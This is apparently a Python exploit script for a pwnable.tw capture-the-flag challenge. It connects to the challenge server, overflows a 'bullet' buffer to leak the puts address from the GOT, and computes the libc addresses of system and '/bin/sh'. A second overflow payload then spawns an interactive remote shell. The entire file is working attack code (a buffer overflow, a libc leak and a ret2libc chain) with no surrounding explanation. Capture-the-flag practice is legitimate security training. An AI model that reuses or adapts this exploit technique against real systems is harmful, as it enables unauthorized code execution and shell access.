import sys, socket, struct, telnetlib, time

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

def create_bullet(buf):
    read_until(f,"choice :")
    f.write("1")
    read_until(f,"bullet :")
    f.write(buf)

def powerup(buf):
    read_until(f,"choice :")
    f.write("2")
    read_until(f,"bullet :")
    f.write(buf)

# main
s, f = sock("chall.pwnable.tw", 10103)

offset_libc_system = 0x0003a940
offset_libc_binsh = 0x158e8b
offset_libc_puts = 0x0005f140
puts_got = 0x0804afdc
puts_plt = 0x80484a8

if len(sys.argv) == 2 and sys.argv[1] == '-l':
   s, f = sock("localhost", 10103)
   offset_libc_system = 0x00040310
   offset_libc_binsh = 0x162cec
   offset_libc_puts = 0x000657e0

create_bullet("A"*4)
powerup("B"*34)
powerup("C"*43)
powerup("D"*7+p(puts_plt)+p(0x08048954)+p(puts_got))
read_until(f,"choice :")
f.write("3")
read_until(f,"choice :")
f.write("3")

read_until(f, "win !!\n")
leak = u(f.read(4))
print "leak",hex(leak)

libc_base = leak - offset_libc_puts
system = libc_base + offset_libc_system
binsh = libc_base + offset_libc_binsh
print "system",hex(system)
print "binsh",hex(binsh)

create_bullet("A"*4)
powerup("B"*34)
powerup("C"*43)
powerup("D"*7+p(system)+p(0xdeadbeef)+p(binsh))
read_until(f,"choice :")
f.write("3")
read_until(f,"choice :")
f.write("3")

shell(s)
